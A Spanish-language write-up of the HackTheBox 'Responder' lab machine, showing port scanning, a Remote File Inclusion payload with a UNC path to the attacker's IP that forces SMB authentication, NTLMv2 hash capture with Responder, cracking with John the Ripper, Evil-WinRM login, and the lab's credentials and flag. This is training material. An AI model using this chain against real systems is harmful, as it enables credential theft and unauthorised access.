+++
title = "Responder"
description = "Máquina de Starting Point enfocada en la enumeración web, explotación de Remote File Inclusion y captura de autenticación NTLMv2."

platform = "HackTheBox"
OS = "Windows"
difficulty = "Very-Easy"

tags = [
"Web",
"RFI",
"NTLMv2",
"Responder",
"WinRM",
"Fundamental Exploitation",
"Starting Point"
]

image = "/images/writeups/Responder/responder.png"
+++

### Descripción general

**Responder** es una máquina perteneciente a **Starting Point** de Hack The Box. Está diseñada para practicar conceptos fundamentales de enumeración de servicios, explotación de **Remote File Inclusion (RFI)**, captura de autenticación **NTLMv2** y acceso remoto mediante **WinRM**.

El objetivo consiste en identificar los servicios expuestos, analizar la aplicación web, aprovechar una inclusión remota de archivos para provocar una autenticación SMB, capturar el hash NTLMv2 con **Responder**, recuperar la contraseña mediante cracking y utilizar las credenciales para acceder al sistema mediante **Evil-WinRM**.

---

### Enumeración

Comenzamos realizando un escaneo completo de puertos con **Nmap**:

```bash
sudo nmap -sC -sV -p- --open --min-rate 5000 -sS -Pn -T5 <TARGET_IP>
```

El resultado muestra dos servicios expuestos:

```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

El sistema operativo identificado es **Windows**.

El puerto `80/tcp` ejecuta un servidor Apache con PHP, mientras que el puerto `5985/tcp` corresponde a **WinRM**, un protocolo de administración remota utilizado en sistemas Windows.

Para acceder correctamente a la web mediante el dominio utilizado por la máquina, configuramos `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

Agregamos:

```text
<TARGET_IP> unika.htb
```

De esta forma podemos acceder al sitio mediante:

```text
http://unika.htb
```

![login\_ok.png](/images/writeups/Responder/pagina.png)

---

### Enumeración web

Al analizar la aplicación encontramos un parámetro `page` utilizado para cargar contenido:

```text
http://unika.htb/index.php?page=
```

Este comportamiento resulta interesante porque el parámetro permite especificar una ubicación externa.

Cuando una web permite cargar archivos desde una ubicación controlada por el usuario, puede producirse una vulnerabilidad conocida como **Remote File Inclusion (RFI)**.

**RFI (Remote File Inclusion)** es una vulnerabilidad en la que una aplicación permite incluir o solicitar recursos ubicados en un servidor remoto controlado por un atacante.

En este caso, la aplicación procesa el parámetro `page`, por lo que podemos investigar qué ocurre cuando le proporcionamos una ubicación remota.

![login\_ok.png](/images/writeups/Responder/LFI_RFI.png)

---

### Explotación de RFI

Para comprender la explotación es importante conocer el concepto de **UNC**.

**UNC (Universal Naming Convention)** es un formato utilizado principalmente en Windows para identificar recursos de red. Su estructura habitual es:

```text
\\servidor\recurso
```

Por ejemplo:

```text
\\10.10.16.125\login
```

Al utilizar una ruta UNC, Windows puede intentar acceder al recurso mediante **SMB (Server Message Block)**, protocolo utilizado para compartir archivos, impresoras y otros recursos dentro de una red.

En una URL podemos representar esta ruta utilizando:

```text
//10.10.16.125/login
```

En nuestro caso utilizamos:

```text
http://unika.htb/index.php?page=//10.10.16.125/login
```

La intención no es obtener directamente un archivo desde nuestra máquina, sino provocar que el servidor Windows intente conectarse a nuestro equipo mediante SMB.

---

### Captura de autenticación NTLMv2

Para recibir la conexión SMB iniciamos **Responder** sobre nuestra interfaz VPN:

![login\_ok.png](/images/writeups/Responder/tool_responder.png)

**Responder** es una herramienta utilizada en pruebas de seguridad para responder a determinados protocolos de resolución de nombres y servicios de red, pudiendo provocar o capturar intentos de autenticación de sistemas Windows.

En este escenario, Responder actúa como un servidor SMB preparado para recibir la conexión generada por la aplicación.

Cuando el servidor Windows intenta acceder al recurso remoto, inicia un proceso de autenticación.

Aquí aparece **NTLMv2**.

**NTLM (NT LAN Manager)** es un protocolo de autenticación utilizado históricamente por sistemas Windows. **NTLMv2** es una versión más robusta del protocolo que utiliza un mecanismo de desafío-respuesta.

De forma simplificada:

```text
Servidor
   ↓
Challenge
   ↓
Cliente
   ↓
NTLMv2 Response
   ↓
Servidor
```

El sistema no envía directamente la contraseña. En su lugar, genera una respuesta basada en la contraseña y el desafío recibido.

Responder puede capturar esa respuesta de autenticación.

Después de realizar la petición hacia la aplicación:

```text
http://unika.htb/index.php?page=//10.10.16.125/login
```

Responder captura:

```text
[SMB] NTLMv2-SSP Client   : <TARGET_IP>
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:...
```

El valor obtenido corresponde a una **respuesta de autenticación NTLMv2**, no a la contraseña en texto plano.

Responder almacena esta información en sus logs:

```text
SMB-NTLMv2-SSP-<TARGET_IP>.txt
```

---

### Cracking del hash

Una vez obtenido el hash NTLMv2, podemos intentar recuperar la contraseña mediante un ataque de diccionario.

Para ello utilizamos **John the Ripper**:

```bash
sudo john -w=/usr/share/wordlists/john.lst SMB-NTLMv2-SSP-<TARGET_IP>.txt
```

John identifica la contraseña asociada al usuario `Administrator`:

```text
badminton        (Administrator)
```

Esto nos permite obtener las credenciales:

```text
Username: Administrator
Password: badminton
```

![login\_ok.png](/images/writeups/Responder/john.png)

Es importante distinguir entre **capturar** y **crackear**:

```text
Responder
    ↓
Captura la respuesta NTLMv2
    ↓
John the Ripper
    ↓
Prueba contraseñas del diccionario
    ↓
Encuentra la contraseña
```

---

### Acceso mediante WinRM

Durante la enumeración inicial identificamos el puerto `5985/tcp`.

Este puerto corresponde a **WinRM (Windows Remote Management)**, un servicio que permite administrar sistemas Windows de forma remota.

Utilizamos **Evil-WinRM**, una herramienta que permite establecer una sesión remota mediante WinRM:

```bash
evil-winrm -i <TARGET_IP> -u administrator -p badminton
```

La conexión es exitosa:

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Ahora contamos con una sesión de PowerShell remota en el sistema Windows.

Enumeramos los directorios de usuarios:

```powershell
cd C:\Users
dir
```

Encontramos:

```text
Administrator
mike
Public
```

La bandera se encuentra en el escritorio del usuario `mike`:

```powershell
cd C:\Users\mike\desktop
dir
```

Obtenemos:

```text
-a----         3/10/2022   4:50 AM             32 flag.txt
```

Finalmente, mostramos su contenido:

```powershell
type flag.txt
```

---

### Bandera

La bandera obtenida es:

```text
ea81b7afddd03efaa0945333ed147fac
```

---

### Conclusión

**Responder** presenta un escenario basado en la enumeración de servicios, explotación de **Remote File Inclusion**, interacción con recursos **UNC/SMB**, captura de autenticación **NTLMv2**, cracking de credenciales y acceso remoto mediante **WinRM**.

El proceso seguido fue:

```text
Enumeración
    ↓
Identificación de HTTP y WinRM
    ↓
Configuración de unika.htb
    ↓
Identificación del parámetro page
    ↓
Identificación de RFI
    ↓
Uso de una ruta UNC
    ↓
Solicitud SMB hacia nuestra máquina
    ↓
Captura de NTLMv2 con Responder
    ↓
Cracking de la respuesta NTLMv2
    ↓
Obtención de credenciales de Administrator
    ↓
Acceso mediante Evil-WinRM
    ↓
Enumeración de usuarios
    ↓
Acceso al escritorio de mike
    ↓
Obtención de la bandera
```

A pesar de su dificultad **Very Easy**, la máquina permite comprender cómo una vulnerabilidad web puede utilizarse como punto de partida para provocar una autenticación SMB y obtener una respuesta NTLMv2. Posteriormente, esta información puede ser analizada mediante técnicas de cracking para recuperar las credenciales y obtener acceso remoto al sistema mediante WinRM.

---

### [Estado: Completada](https://labs.hackthebox.com/achievement/machine/3933963/461)
